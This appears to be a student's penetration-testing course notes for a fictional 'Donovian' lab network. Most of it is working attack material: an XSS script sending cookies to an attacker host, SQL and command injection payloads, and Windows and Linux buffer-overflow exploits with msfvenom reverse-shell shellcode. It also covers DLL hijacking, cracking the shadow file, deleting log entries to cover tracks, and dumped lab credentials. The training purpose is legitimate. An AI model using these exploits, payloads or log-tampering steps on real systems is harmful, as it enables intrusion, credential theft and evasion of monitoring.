# RECONNAISSANCE
==================================================================================================
==================================================================================================
Username     : MIDY-003-M  	
Password     : password
Stack #      :  	
CTFd         :
MYIP         : 10.50.39.43
Lin.internet : 10.50.28.189
Lin.Ops      : 10.50.25.1
Win.Ops      : 10.50.29.185
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
# SSH EXAMPLES
--------------------------------------------------------------------------------------------------
# multisocket to jump
	ssh -MS /tmp/jump student@10.50.28.189  
	ssh -MS /tmp/jump student@10.50.39.43
   
# forward to pivot                    
	ssh -S /tmp/jump -O forward -L10000:192.168.28.120:4242 DUMB 


# multisocket to Pivot	 
	ssh -MS /tmp/Piv student@127.0.0.1 -p10000 

# dyno on Pivot                  
	ssh -S /tmp/Piv -O forward -D 9050 dummy
                     
# scan ports

# forward to next box	                                                              
	ssh -S /tmp/Piv -O forward -L10112:192.168.150.245:9999  

# multisocket to next box    
	ssh -MS /tmp/T1 student@127.0.0.1 -p10111                    
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
# SCP 
--------------------------------------------------------------------------------------------------
# Copy a local file to a remote host:
	scp path/to/local_file remote_host:path/to/remote_file
	scp ~/Local.exe remote@0.0.0.0:~/Remote.exe
	
# Use a specific port when connecting to the remote host:
	scp -P port path/to/local_file remote_host:path/to/remote_file	
	scp -P 1234 ~/Local.exe remote@0.0.0.0:~/Remote.exe
	
# Copy a file from a remote host to a local directory:
	scp remote_host:path/to/remote_file path/to/local_directory
	scp remote@0.0.0.0:~/Remote.exe ~/Local.exe
	
# Use a specific port when connecting to the remote host:
	scp -P port remote_host:path/to/remote_file path/to/local_file
	scp -P 1234 remote@0.0.0.0:~/Remote.exe ~/Local.exe
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
# RDP
--------------------------------------------------------------------------------------------------
xfreerdp /v:10.50.29.185 /u:student +clipboard +dynamic-resolution +glyph-cache
xfreerdp /v:localhost:10001 /u:student +clipboard +dynamic-resolution +glyph-cache
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
# NMAP scanning
--------------------------------------------------------------------------------------------------
# PORTS
sudo proxychains nmap -Pn -T4 -sT -p1-10000 192.168.150.245 2>/dev/null      # find ports
 
# HOSTS
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done  # find hosts
    
# SCRIPTS
--script http-enum.nse
--script smb-os-discovery.nse //only with windows

# BANNER 
proxychains nc 10.100.28.40 80
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------
# WEBSITES
--------------------------------------------------------------------------------------------------
https://gchq.github.io/CyberChef/                          -- CYBERCHEF

https://crontab.guru/                                      -- CRONTAB GURU

https://gtfobins.github.io/#                               -- GTFOBINS

https://sec.cybbh.io/public/security/latest/index.html     -- FACILITAION GUIDE

10.50.20.250:8000                                          -- CTFD

===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
# WEB EXPLOITATION(XSS)
# Web Expliotation (XSS)
**Requests**
GET
POST
HEAD
PUT

**HTTP Response Codes**
10X == Informational
2XX == Success
30X == Redirection
4XX == Client Error
5XX == Server Error

https://user-agents.net/lookup

Check for Robots.txt

sudo apt install nikto -y

nikto -h 10.100.28.40

**Attack Methods**
//Cookie script  ------did not do -- cookie found in back end

 <script>document.location="http://10.100.28.55/Cookie.php?username=" + document.cookie;</script>


//Directory Traversal(GET) -- myfile=../../../../etc/passwd
//Directory Traversal(POST) -- File to read [../../../../etc/passwd]

//Malicious File Upload
Bad.php -- on lin-ops
goes to /uploads

//Command Injection
;whoami
;cat /etc/passwd
;ls -latr & netstat -rn
|| ifconfig

//SSH Key Upload
ssh -keygen -t rsa -- on lin-ops
cat ~/.ssh/id_rsa.pub  --copy this
                    --on web host
whoami -- find user                    
cat /etc/passwd -- find users home directory                    
ls -la /users/home/directory      --check if .ssh exists
mkdir /users/home/directory/.ssh   --make .ssh in users home folder if it does not exist
echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys  -- puts ssh key in dir
cat /users/home/directory/.ssh/authorized_keys  -- verify
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
# WEB EXPLOITATION(SQL)

FOLLOW THE STEPS
we are using "mysql"
we wont be writeing to a database
may be case sensitive
Schema and Database are interchangable
@@Version gives version number
GET -- URL  ---- if you cant type, it is a get method
POST -- input box

if you see username and password input fields, use sql

DONT FORGET ABOUT THE "ESCAPE STRING"

Database(tables(columns(data)))


[Information_schema]
[mysql]               ----- These are defaults
[performance_schema] 

**Select**
**Union**


SHOW DATABASES;
show tables;
select * from session.car;

select * from session.car UNION select name,type,cost,color from session.car:

------------------------------------------------
###TESTING###
IF LOGIN PAGE TEST SQL BY USING THIS
'or 1='1

GO TO DEVCON, OPEN NETWORK TAB, CLICK REQUEST, POST METHOD, HIT 'RAW' SWITCH, COPY CONTENTS
PUT '?' AFTER THE URL, PASTE RAW CONTENTS

THE ONLY THING YOU CAN GET FROM A LOGIN PAGE IS USERNAMES AND PASSWORDS

------------------------------------------------
###DUMPING THE DATABASE###
**using valid querys to dump the databases**

POST            Audi'or 1='1

GET             OR 1 = 1 ;#

------------------------------------------------
###FINDING THE AMOUNT OF COLUMNS###

Audi' UNION SELECT 1,2,3,4,5;#

------------------------------------------------
###GOLDEN STATEMENT###
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;#

---POST
**WORKING EXAMPLES**
UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns;#
Audi'UNION SELECT id,2,name,pass,5 FROM session.user;#
Audi'UNION SELECT tireid,2,name,size,cost FROM session.Tires;#


---GET
**WORKING EXAMPLES**
?Selection=2 UNION SELECT 1,3,2 FROM information_schema.columns;#
?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
?Selection=2 UNION SELECT username,studentID,passwd FROM session.userinfo;#

?category=1 UNION SELECT username,password,permission FROM sqlinjection.members;#

UNION SELECT user_id,username,name FROM siteusers.users;#

===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
# REVERSE ENGINEERING
use ghidra
inport file 
auto analyze file 
search string using toolbar 
find the functions it uses to get input 

===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
# WINDOWS EXPLOITATION DEV

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.111
->T2: 192.168.28.105

>Jump Box
->donovian_grey_host
-->T3: 192.168.150.245

Target Section:

T1
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
Action: Exploit binary.

T2
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: 192.168.150.245
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine


===============================================================================================
===============================================================================================

## ssh to remote machine
	 ssh -MS /tmp/jump student@10.50.28.189                          --multisocket to jump
	 ssh -S /tmp/jump -O forward -L10111:192.168.28.120:4242 DUMB    --forward to pivot
	 ssh -MS /tmp/T1 student@127.0.0.1 -p10111                       --multisocket/conn. to Pivot
	 ssh -S /tmp/T1 -O forward -D 9050 dummy                         --Dyno on Pivot
sudo proxychains nmap -Pn -T4 -sT -p1-10000 192.168.150.245 2>/dev/null  --find ports
	 ssh -S /tmp/T1 -O forward -L10112:192.168.150.245:9999


# run Secureserver.exe  ----- or banner grab to see if it is already running

# open immunity debugger  ---- only on win-ops

# Click file>>attach>>secureserver>> play button in top left

# Create python script ---- unless you already have it for that dll
------------------------------------------------------------------------------------------------
import socket

buf = "TRUN /.:/"
buf += "A" * 5000

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.65.10", 9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()
------------------------------------------------------------------------------------------------

# generate 5000 character pattern and replace ""A" * 5000" with pattern

# run python script

# find eip in debugger register window

# put that value in the offset field on the pattern website (wiremask.eu)

# get the offset and edit script accordingly 

# change "" buf += "**pattern**" "" to>> "" buf += "A" * 2003 ""

# add "" buf += "BBBB" ""

# go to debugger hit the rewind arrows then hit play

# run script

# confirm on debugger that the eip is 42424242 which is the "BBBB"

# stay on immunity debugger

# Run " !mona jmp -r esp -m "essfunc.dll" " in the bottom input space of the debugger

# click window>>logdata>> copy hex value for eip --- 0x625012A0
						       62 50 12 A0
# Reverse the indian "\xA0\x12\x50\x62"

# edit script, replace "BBBB" with "\xA0\x12\x50\x62"

# Close out of immunity bugger 

# create shellcode on lin-ops
# use the public ip for your lin-ops when 
# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.25.1 lport=4444 -b "\x00" -f python

# copy shellcode other than the first line

# paste in script below eip

# create nop sled in script
# buf += "\x90" * 10

# open a new terminal

# run commands 
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 4444

# make sure secureserver is running on winops

# enter command run on msfconsole

# run python script

# meterpreter should be open if not, trouble shoot, regen shellcode, change nopsled

# type shell to get shell
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
# LINUX EXPLOITATION DEV
Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.111
->T2: 192.168.28.105

>Jump Box
->donovian_grey_host
-->T3: 192.168.150.245

Target Section:

T1
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
Action: Exploit binary.

T2
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: 192.168.150.245
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine


===============================================================================================
===============================================================================================

#First SCP the executable from remote machine

## ssh to remote machine
	# ssh -MS /tmp/jump student@10.50.28.189 
	# ssh -S /tmp/jump -O forward -L10100:192.168.28.111:2222 DUMB
	# ssh -MS /tmp/T1 comrade@127.0.0.1 -p10100
# scp -P2222 inventory.exe student@10.50.25.1:~/op

# Copy a local file to a remote host:
scp path/to/local_file remote_host:path/to/remote_file

# Use a specific port when connecting to the remote host:
scp -P port path/to/local_file remote_host:path/to/remote_file

# Copy a file from a remote host to a local directory:
scp remote_host:path/to/remote_file path/to/local_directory

# Ran the executable

# it accepts user input

# it is susceptable to overflow

# ran the command "gdb inventory.exe"

#peda opened, ran "pdisass main"

# ran pdisass "getTheGoods"

# researched "fgets and printf" -- fgets is vulnerable to buffer overflow

# made my python file, now obtaining buffer pattern from 
https://wiremask.eu/tools/buffer-overflow-pattern-generator/ 



##script 
------------------------------------------------------------------------------------------------
overflow ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6
Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad
7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A
f8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

print(overflow)
------------------------------------------------------------------------------------------------

# ran command run <<< $(python elf_buff.py)  --- with 3 carrots because it takes user input


# entered returned hex value in website above and got "76"



# edit script
------------------------------------------------------------------------------------------------
overflow = "A" * 76
eip = "B" * 4
print(overflow + eip)
------------------------------------------------------------------------------------------------



# exit out of peda, enter the following commands
#
# env - gdb func
# unset env LINES
# unset env COLUMNS
# run

# info proc map

##get start addr below heap and end addr above stack, add hex for JMP AND ESP after

# find /b 0xf7de1000,0xf7ffe000,0xff,0xe4  ----- run in gdb

0xf7 f6 53 43
0xf7f65497
xf7f655cf
0xf7f65777
0xf7f659ef
0xf7f662eb
0xf7f6649b
0xf7f66533


## msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python  -- generate shellcode




#EDIT script
------------------------------------------------------------------------------------------------
overflow = "A" * 76

##change eip to the reverse indian of returned values above##
eip = "\x43\x53\xf6\xf7"

##create NOP sled##
nop = "\x90" * 10

## SHELLCODE from msfvenom command ## 
buf =  b""
buf += b"\xb8\x7c\xb3\xf8\x83\xd9\xed\xd9\x74\x24\xf4\x5b"
buf += b"\x2b\xc9\xb1\x0b\x83\xc3\x04\x31\x43\x10\x03\x43"
buf += b"\x10\x9e\x46\x92\x88\x06\x30\x31\xe9\xde\x6f\xd5"
buf += b"\x7c\xf9\x18\x36\x0c\x6d\xd9\x20\xdd\x0f\xb0\xde"
buf += b"\xa8\x2c\x10\xf7\xac\xb2\x95\x07\xc4\xda\xfa\x66"
buf += b"\x47\x73\x05\x3e\xc4\x0a\xe4\x0d\x6a"

##change print statement##
print(overflow + eip + nop + buf)
------------------------------------------------------------------------------------------------





## regenerated shellcode

## ./inventory.exe <<< $(python elf_buff.py)

## successful execution  --- user student




## Copy and paste script to remote machine
------------------------------------------------------------------------------------------------
overflow = "A" * 76

##change eip to the reverse indian of returned values above##
eip = "\x43\x53\xf6\xf7"

##create NOP sled##
nop = "\x90" * 10

## SHELLCODE from msfvenom command ## 
buf =  b""
buf += b"\xd9\xe1\xb8\xbc\x52\x40\xcb\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x0b\x31\x46\x19\x83\xee\xfc\x03\x46"
buf += b"\x15\x5e\xa7\x2a\xc0\xc6\xd1\xf9\xb0\x9e\xcc\x9e"
buf += b"\xb5\xb9\x67\x4e\xb5\x2d\x78\xf8\x16\xcf\x11\x96"
buf += b"\xe1\xec\xb0\x8e\xf5\xf2\x34\x4f\x8d\x9a\x5b\x2e"
buf += b"\x1c\x33\xa4\xe7\x8d\x4a\x45\xca\xb2"

print(overflow + eip + nop + buf)
------------------------------------------------------------------------------------------------


## ssh to remote machine

# ssh -MS /tmp/jump student@10.50.28.189 
# ssh -S /tmp/jump -O forward -L10100:192.168.28.111:2222 DUMB
# ssh -MS /tmp/T1 comrade@127.0.0.1 -p10100


## Go to directory with executable

# env - gdb func
# unset env LINES
# unset env COLUMNS
# run

# info proc map

##get start addr below heap and end addr above stack, add hex for JMP AND ESP after

# find /b 0xf7def000,0xf7ffe000,0xff,0xe4  ----- run in gdb

0xf7f7365b
0xf7f73c5f
0xf7f73c67
0xf7f742c3
0xf7 f7 43 db

"\xdb\x43\xf7\xf7"

# change eip in my script

## ./inventory.exe <<< $(python elf_buff.py)

# after sucessful execution change shellcode

## generate new shellcode
# msfvenom -p linux/x86/exec CMD="cat /.secret/.verysecret.pdb" -b "\x00" -f python

# change shellcode in script

## Troubleshoot
run as sudo
generate new shellcode
change to new eip

===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
# Post Exploitation

Just got on a box: (device verification)
	hostname
	whoami
	ip a
Ping sweep the network the box is in:
	for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
	
	cat /etc/hosts		# shows who else you're connected to
	
Extra Information Gathering:
	ps -elf		# Is it remote logging (rsyslogd) / search for running scripts, read them (check if it's running on LinOps or not)
				kaspersky norton antivirus rkhunter WindowsDefender	Search for antivirus running	ls -latr /etc		# see what is configured
	ls -latr /var/log	# see logs
	systemctl --type=service --no-pager	crontab -l
	https://crontab.guru/
	ls -latr /etc/cron*
	/etc/cron.d
	ls -latr /var/spool/cron/crontabsAlways search directories: ITEMS MAY BE HIDDEN
	/tmp
	/home/<currentuser>
	/home
	find / -type f -iname ".*" 2>/dev/null	# use a . to search just the location you're in
	
Interesting Files:
	
	rootkit
	ransomware
	virus
	trojan
	worm
	
Sudo file:	Tells you what you can sudo
	sudo -l
	cat /etc/passwd (in sudo group?)
	cat /etc/group | grep "username"rsyslog:
	/etc/rsyslog.conf
	ls -latr /etc/rsyslog.d
		ufw.conf
		default.conf	<- usually this one
		cloudinit.conf
	grep -v "#" /etc/rsyslog.d/50-default.conf
	IF IT IS NOT GOING TO /var/log THAT IS SUS, LOOK AT ITSniff Traffic:
	tcpdump
	
Be sure that binary's have the executable bit setSCP DEMO:
	ssh -MS /tmp/young student@10.50.37.30
	scp -o "ControlPath=/tmp/young" randomtext:/home/student/file.txt . <---- dot means current directory on me
	scp -o "socket made to machine" source destination
crontab.gurucrontab.guru
Crontab.guru - The cron schedule expression editor
An easy to use editor for crontab schedules.
8:30
-----------------------------------------------------------------------------------------
## Post Exploitation
-----------------------------------------------------------------------------------------
Local Host EnumerationCommands to run on every machine:
User Enumeration:
	Windows:
		net user		#shows local users
	Linux:
		cat /etc/passwd	#contains users, group info, uid, home directory, shell info
		
Process Enumeration:
	Windows:
		tasklist /v		#doesn't show pids
	Linux:
		ps -elf		#not gospel, processes may be dynamic, htop or topService Enumeration:
	Windows:
		tasklist /svc		
	Linux:
		chkconfig				#SysV
		systemctl --type=service --no-pager	#SystemDNetwork Connection Enumeration
	Windows:
		ipconfig /all
	Linux:
		ifconfig -a
		ip a	
	
Data Exfiltration:
	session transcript:
		ssh <user>@<host> | tee <file>	Encrypted Transport:
		scp <source> <destination>
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
# PRIV ESC,PERSIST & COVERING TRACKS WINDOWS
  
Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Windows host.

Tools/Techniques: SSH and RDP masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Windows techniques to gain privileged access such as DLL hijack, UAC bypass through weak paths, permissions, and tasks. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = 3@SYw1nd0w55t@rt0F@ct1v1ty

Prior Approvals: DLL hijack and UAC bypass, restarting of services through host reboot. Host survey utilizing native command shells, which shell is at discretion of student.

Scheme of Maneuver:
>Jump Box
->Pivot: 192.168.28.105
-->T1: 192.168.28.5

Target Section:

Pivot
Hostname: ftp.site.donovia
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: donovian-windows-private
IP: 192.168.28.5
OS: Windows ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: 3389
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.


==================================================================================================
==================================================================================================
# PRIV ESC, PERSIST, COVER TRACKS 
  
schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM   handler" -NotMatch

sigcheck C:\Users\student\exercise_2\putty.exe      --- check execution level, -- check version numbers

icacls   C:\Users\student\exercise_2\putty.exe      --- checks if directory can be written too




msfvenom -p windows/shell_reverse_tcp LHOST=10.50.25.1 LPORT=4444 -f dll > WINMM.dll
msfvenom -p windows/shell_reverse_tcp LHOST=10.50.25.1 LPORT=4444 -f exe > rename.exe



ssh -S /tmp/jump -O forward -L10000:192.168.28.105:2222 DUMB       ##forward to pivot
ssh -MS /tmp/Pivot comrade@127.0.0.1 -p10000                       ##multisocket/conn. to Pivot
ssh -S /tmp/Pivot -O forward -L10001:192.168.28.105:3389 what      ##pivot to T1

xfreerdp /v:127.0.0.1:10005 /u:Lroth +clipboard +dynamic-resolution +glyph-cache


**FIND SERVICE THAT IS CALLING OUT TO A CERTAIN DLL THAT DOESNT EXIST AND MAKE A DLL WITH THAT NAME, OR IF IT DOES EXIST MAKE YOURS BE READ BEFORE THE REAL ONE, THE ORDER IS IN FG**


load up msfconsole 
set payload windows/shell_reverse_tcp
set lhost 0.0.0.0
set lport 4444

restart the machine because the service dll is loaded on boot.

===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
# PRIV ESC, PERSIST & COVERING TRACKS LINUX
  
Tools/Techniques: SSH masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Linux techniques to gain privileged access and persist are limited to host misconfigurations, open suid/sgid, weak permissions, and path. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = H@RDl1nux5t@rt0F@ct1v1ty

Prior Approvals: Privilege escalation, persistence, and restarting of services through host reboot. Host survey and log sanitation utilizing native command shells, which shell is at discretion of student. NOT authorized is uploading of tools or altering account information.


Target Section:

Pivot
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
PSP: rkhunter
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: unknown
IP: 192.168.28.27
OS: Linux ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: unknown
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.

T2
Hostname: unknown
IP: 192.168.28.12
OS: Linux ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: unknown
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.


Scheme of Maneuver:
>Jump Box
->Pivot:192.168.28.105
--->T1: 192.168.28.27
--->T2: 192.168.28.12

==================================================================================================
==================================================================================================

ssh -MS /tmp/jump student@10.50.28.189 
ssh -S /tmp/jump -O forward -L10001:192.168.28.105:2222 DUMB
ssh -MS /tmp/Piv comrade@127.0.0.1 -p10001 --------------------- comrade :: StudentReconPassword

ssh -S /tmp/Piv -O forward -D 9050 dummy

sudo proxychains nmap -Pn -T4 -sT -p1-10000 192.168.28.27 2>/dev/null

ssh -S /tmp/Piv -O forward -L10002:192.168.28.27:22 DUMB
ssh -MS /tmp/T1 comrade@127.0.0.1 -p10002 -------- StudentPrivPassword

ssh -S /tmp/Piv -O forward -L10003:192.168.28.12:22 DUMB
ssh -MS /tmp/T1 comrade@127.0.0.1 -p1000


ghjcnbnenrf      (zeus)


#### DO THESE ON LINUX ##   
    Adding or hijacking a user account

    Adding or modifying a CRON job   ------ CRONTAB GURU

**Lateral escalation is still priv escalation, bob cant see janes home dir but jane can.**

## SUDO ##
can SUDO run cat ??
sudo the /etc/shadow file and crack the password

apt get 
vim 


## SUID/SGID ##
suid -- allows you to run the executable as the owner of the file
sgid --^^^^ 

CRON
/tmp
dont write to a users home directory -- write to /tmp
"." -- current directory

 ** IF YOU FIND A NON-STANDARD LINUX BINARY, FUZZ IT**
 
 we are only useing systemd

auth.log/secure -- Logins/authentications

lastlog -- Each users' last successful login time

btmp -- Bad login attempts
sulog -- Usage of SU command
utmp -- Currently logged in users (W command)
wtmp -- Permanent record on user on/off


head/tail to view logs

**Make a copy of the log file, dont work on the live log**

egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2

RSYSLOG -- BAD -- look at the config file
/etc/rsyslog.d/*
/etc/rsyslog.conf




https://gtfobins.github.io/
==================================================================================================
==================================================================================================
## LINUX PRIV ESC ##
==================================================================================================
whoami && hostname


**SUDO**
sudo -l


**SUID AND SGID**
find / -type f -perm /2000 2>/dev/null -- guid
find / -type f -perm /4000 2>/dev/null -- suid
find / -type f -perm /6000 2>/dev/null -- both


**DOT IN PATH DEMO** -- dot will already be there, i will never add a dot
vim ls -- create #!/bin/bash

**JOHNTHERIPPER**
---ZEUS IS THE USER FOR US TO CRACK
you need pass hashes from shadow to crack passwords
use the password list that you are given

sudo apt install john

john --wordlist=passwords.txt shadow.txt
write down all passwords
john shadow.txt --show


sudo vim /etc/sudoers

egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2

egrep -v '172.*'

===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
# MISC
  
## SSH
ssh student@10.50.28.189 -D 9050
ssh student@10.50.28.189 -L1111:192.168.28.111:8080
proxychains nmap -Pn -T4 -n -p1-10000 192.168.128.111

## NEW SSH
ssh -MS /tmp/jump student@10.50.28.189 
ssh -S /tmp/jump dummy
ssh -S /tmp/jump -O forward -D 9050 dummy  --- DYNO port 
ssh -S /tmp/jump -O cancel -D 9050 dummy  --- DYNO port 


ssh -S /tmp/jump -O forward -L1111:10.100.28.40:80 DUMB
ssh -S /tmp/jump -O forward -L10100:192.168.28.111:2222 DUMB
ssh -S /tmp/jump -O forward -L10100:192.168.28.111:2222 DUMB
ssh -MS /tmp/T1 student@127.0.0.1 -p10100

 
PORT ENUMERATION:  
    sudo proxychains nmap -Pn -T4 -sT -p1-10000 10.100.28.40 2>/dev/null





# SCRAPING 
path on lin-ops to scrape script 
	~/Scrape/Scrape.py
found in the FG under lesson 2 reconnaissance

===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================
===================================================================================================

## DRYRUN NOTES

You are authorized to modify passwords to user accounts.

You will not use Metasploit tools for any affect with the exception of shellcode generation.

Scrape appropriate web content that will provide operational data

# TUNNELS
ssh -S /tmp/jump -O forward -L10000:10.50.39.43:80 HTTP
ssh -S /tmp/jump -O forward -L10001:10.50.39.43:22 ssh
ssh -MS /tmp/pub user2@127.0.0.1 -p10001
ssh -S /tmp/pub -O forward -D 9050 dummy
cat /etc/hosts
192.168.28.181 WebApp
sudo proxychains nmap -Pn -T4 -sT -p1-10000 192.168.28.181 2>/dev/null      # find ports
ssh -S /tmp/pub -O forward -L10002:192.168.28.181:80 HTTP
ssh -S /tmp/pub -O forward -L10003:192.168.28.181:22 SSH

ssh -MS /tmp/app user2@127.0.0.1 -p10003 ---- not working

for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done  # find hosts

ssh -S /tmp/pub -O forward -L10004:192.168.28.172:22 ssh
ssh -MS /tmp/app Aaron@127.0.0.1 -p10004 ---- were in


ssh -S /tmp/app -O forward -L10005:192.168.28.179:22 ssh
ssh -MS /tmp/win Lroth@127.0.0.1 -p10006
ssh -S /tmp/app -O forward -L10006:192.168.28.179:3389 RDP

 ssh -S /tmp/app -O forward -L10007:192.168.28.179:9999  SS






# PUBLIC FACING WEBSITE
Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER78 ) 1Array ( [0] => user3 [name] => user3 [1] => Obo4GURRnccyrf [pass] => Obo4GURRnccyrf ) 1Array ( [0] => Lee_Roth [name] => Lee_Roth [1] => anotherpassword4THEages [pass] => anotherpassword4THEages ) 1



( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => EaglesIsARE78 )

( [0] => user3 [name] => user3 [1] => Obo4GURRnccyrf [pass] => Bob4THEEapples )

( [0] => Lee_Roth [name] => Lee_Roth [1] => anotherpassword4THEages [pass] => anotherpassword4THEages )





root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin 
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin 
syslog:x:102:106::/home/syslog:/usr/sbin/nologin 
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin 
lxd:x:105:65534::/var/lib/lxd/:/bin/false 
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin 
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin 
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin 
pollinate:x:110:1::/var/cache/pollinate:/bin/false 
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash 
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false 

user2:x:1001:1001::/home/user2:/bin/sh 




# BESTWEBAPP

1 	Aaron 	$Aaron
2 	user2 	$user2
3 	user3 	$user3
4 	Lee_Roth 	$Lroth
